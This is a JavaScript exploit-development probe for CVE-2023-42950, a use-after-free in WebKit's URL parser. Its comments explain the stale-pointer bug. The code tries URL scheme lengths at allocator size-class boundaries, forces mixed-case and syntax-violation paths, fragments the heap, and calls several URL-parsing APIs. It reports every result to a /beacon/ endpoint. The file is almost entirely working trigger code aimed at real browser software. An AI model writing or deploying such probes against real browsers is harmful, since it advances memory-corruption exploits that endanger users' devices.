// p130 — CVE-2023-42950 URLParser UAF probe
// Bug: URLParser.cpp line 1211-1214
//   appendToASCIIBuffer(':')  ← can trigger Vector<LChar> realloc
//   StringView urlScheme = parsedDataView(0, m_url.m_schemeEnd)  ← stale pointer
//   switch (scheme(urlScheme))  ← reads freed memory
//
// Trigger: URL with scheme string at exact Vector capacity boundary
// Vector<LChar> growth follows bmalloc size classes
// Scheme must be valid chars (alphanumeric + +-.  per RFC 3986)
//
// Strategy: try scheme lengths at common capacity boundaries
// bmalloc small sizes: 16,32,48,64,80,96,112,128,192,256,384,512...
// The ':' append is the one that overflows capacity
// Beacon prefix: V130U-
(function(){
var rid='v130u'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V130U-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V130U-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe130-start');

// ======== U1: URL constructor availability ========
function testU1(){
  var r={};
  try{
    r.urlCtor=(typeof URL==='function');
    var u=new URL('https://example.com');
    r.urlWorks=true;
    r.protocol=u.protocol;
    r.host=u.hostname;

    // Test with custom scheme
    try{
      var u2=new URL('custom://test');
      r.customScheme=true;
      r.customProto=u2.protocol;
    }catch(e){
      r.customErr=e.constructor.name;
    }

    // Test with long scheme
    var longScheme='a'.repeat(100)+'://x';
    try{
      var u3=new URL(longScheme);
      r.longSchemeOK=true;
      r.longProto=u3.protocol;
      r.longProtoLen=u3.protocol.length;
    }catch(e){
      r.longSchemeErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
    }

    // URL.maxSchemeLength check
    var veryLong='a'.repeat(10000)+'://x';
    try{
      var u4=new URL(veryLong);
      r.veryLongOK=true;
    }catch(e){
      r.veryLongErr=e.constructor.name;
    }
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== U2: Scheme length boundary scanner ========
// Try scheme lengths around Vector capacity boundaries
// The Vector<LChar> starts small and grows
// We want the ':' append to trigger the realloc
function testU2(){
  var r={};
  var results=[];
  // Test at every length from 1 to 520 (covers common size classes)
  // Focus on boundaries: 15,16,31,32,47,48,63,64,127,128,255,256,511,512
  var targetLengths=[
    7,8,15,16,17,23,24,31,32,33,39,40,47,48,49,
    55,56,63,64,65,79,80,81,95,96,97,111,112,113,
    127,128,129,143,144,159,160,191,192,193,
    223,224,255,256,257,319,320,383,384,385,
    447,448,511,512,513
  ];

  for(var i=0;i<targetLengths.length;i++){
    var len=targetLengths[i];
    if(len>512) break; // URL.maxSchemeLength may cap this
    var scheme='a'.repeat(len);
    var url=scheme+'://x';
    var sub={len:len};
    try{
      var u=new URL(url);
      sub.ok=true;
      sub.protoLen=u.protocol.length; // includes ':'
    }catch(e){
      sub.err=e.constructor.name;
      // TypeError = invalid URL (scheme too long)
      // If we get a crash here, that's our signal
    }
    results.push(sub);
  }
  r.results=results;
  r.tested=results.length;
  return r;
}

// ======== U3: Trigger realloc with mixed-case (syntaxViolation path) ========
// Upper case triggers syntaxViolation(c) which may affect buffer differently
function testU3(){
  var r={};
  var results=[];
  // syntaxViolation may cause a buffer copy/reallocation
  // Test with uppercase letters that get lowercased
  var targetLengths=[15,16,31,32,47,48,63,64,95,96,127,128,191,192,255,256];

  for(var i=0;i<targetLengths.length;i++){
    var len=targetLengths[i];
    // Alternate case to trigger syntaxViolation more
    var scheme='';
    for(var j=0;j<len;j++){
      scheme+=(j%2===0)?'A':'a';
    }
    var url=scheme+'://x';
    var sub={len:len,mixed:true};
    try{
      var u=new URL(url);
      sub.ok=true;
      sub.protoLen=u.protocol.length;
    }catch(e){
      sub.err=e.constructor.name;
    }
    results.push(sub);
  }
  r.results=results;
  return r;
}

// ======== U4: Stress test — rapid URL parsing ========
// Parse many URLs rapidly to increase chance of hitting the realloc window
// Also interleave with allocations to fragment the heap
function testU4(){
  var r={};
  try{
    var crashes=0;
    var successes=0;
    var errors=0;

    // Focus on lengths 60-68 (around 64 boundary)
    // and 124-132 (around 128 boundary)
    for(var round=0;round<50;round++){
      // Allocate and free to fragment heap
      var frags=[];
      for(var f=0;f<100;f++){
        frags.push(new ArrayBuffer(64));
      }
      frags=null;

      for(var len=60;len<=68;len++){
        try{
          var u=new URL('a'.repeat(len)+'://x');
          successes++;
        }catch(e){
          if(e.constructor.name==='TypeError') errors++;
          else crashes++;
        }
      }
      for(var len2=124;len2<=132;len2++){
        try{
          var u2=new URL('a'.repeat(len2)+'://x');
          successes++;
        }catch(e){
          if(e.constructor.name==='TypeError') errors++;
          else crashes++;
        }
      }
    }
    r.successes=successes;
    r.errors=errors;
    r.crashes=crashes;
    r.rounds=50;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== U5: URL parsing via different APIs ========
// Test if other URL-parsing paths trigger the same code
function testU5(){
  var r={};
  try{
    var scheme64='a'.repeat(64);

    // document.createElement('a').href
    try{
      var a=document.createElement('a');
      a.href=scheme64+'://x';
      r.anchorHref=a.href;
      r.anchorProto=a.protocol;
    }catch(e){
      r.anchorErr=e.constructor.name;
    }

    // window.location (can't actually navigate, just test parsing)
    // fetch with custom URL
    try{
      fetch(scheme64+'://x').catch(function(){});
      r.fetchOK=true;
    }catch(e){
      r.fetchErr=e.constructor.name;
    }

    // WebSocket URL parsing
    try{
      var ws=new WebSocket(scheme64+'://x');
      r.wsOK=true;
      ws.close();
    }catch(e){
      r.wsErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
    }

    // XMLHttpRequest
    try{
      var xhr=new XMLHttpRequest();
      xhr.open('GET',scheme64+'://x');
      r.xhrOK=true;
    }catch(e){
      r.xhrErr=e.constructor.name;
    }

    // Image src
    try{
      var img=new Image();
      img.src=scheme64+'://x';
      r.imgSrc=img.src.slice(0,30);
    }catch(e){
      r.imgErr=e.constructor.name;
    }
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== U6: syntaxViolation — the key to forced buffer copy ========
// syntaxViolation() at URLParser.h:~line 95 is the critical function
// When called, it copies m_inputString into m_asciiBuffer
// This means: if we have a LONG URL and trigger syntaxViolation early,
// the buffer gets populated from the input string
// Then ':' append might overflow it
function testU6(){
  var r={};
  try{
    // syntaxViolation triggers on: uppercase scheme char, tab/newline in URL,
    // or other normalization needs
    // Strategy: long URL with uppercase first char → syntaxViolation →
    // buffer populated from input → ':' append triggers realloc

    var results=[];
    // The input is copied into m_asciiBuffer on first syntaxViolation
    // After copy, buffer size = position in URL at that point
    // Further appends grow from there
    // If the copy puts us right at capacity, next append reallocs

    for(var len=1;len<=512;len++){
      // First char uppercase triggers syntaxViolation immediately
      var scheme='A'+'b'.repeat(len-1);
      var url=scheme+'://x';
      var sub={len:len};
      try{
        var u=new URL(url);
        sub.ok=true;
      }catch(e){
        sub.err=e.constructor.name;
        if(e.constructor.name!=='TypeError'){
          sub.unexpected=true;
          sub.msg=String(e.message||'').slice(0,60);
        }
      }
      results.push(sub);
    }

    // Find which lengths failed with non-TypeError
    var unexpected=results.filter(function(x){return x.unexpected;});
    r.totalTested=results.length;
    r.successCount=results.filter(function(x){return x.ok;}).length;
    r.typeErrorCount=results.filter(function(x){return x.err==='TypeError';}).length;
    r.unexpectedCount=unexpected.length;
    if(unexpected.length>0){
      r.unexpectedLens=unexpected.map(function(x){return x.len;});
      r.unexpectedMsgs=unexpected.map(function(x){return x.msg;}).slice(0,5);
    }

    // Check maxSchemeLength
    r.maxSchemeLen=results.filter(function(x){return x.ok;}).length>0?
      results.filter(function(x){return x.ok;}).slice(-1)[0].len:'none';
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'U1-URL-BASIC',fn:testU1},
    {name:'U2-BOUNDARY-SCAN',fn:testU2},
    {name:'U3-MIXED-CASE',fn:testU3},
    {name:'U4-STRESS',fn:testU4},
    {name:'U5-MULTI-API',fn:testU5},
    {name:'U6-SYNTAX-VIOL',fn:testU6}
  ];
  for(var t=0;t<tests.length;t++){
    try{
      var result=tests[t].fn();
      if(result&&typeof result.then==='function') result=await result;
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
